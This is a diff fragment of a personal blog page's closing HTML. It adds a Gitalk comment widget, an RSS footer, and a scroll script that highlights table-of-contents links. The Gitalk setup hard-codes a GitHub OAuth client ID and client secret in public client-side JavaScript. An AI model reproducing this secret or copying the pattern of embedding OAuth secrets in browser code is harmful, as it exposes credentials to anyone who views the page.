+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
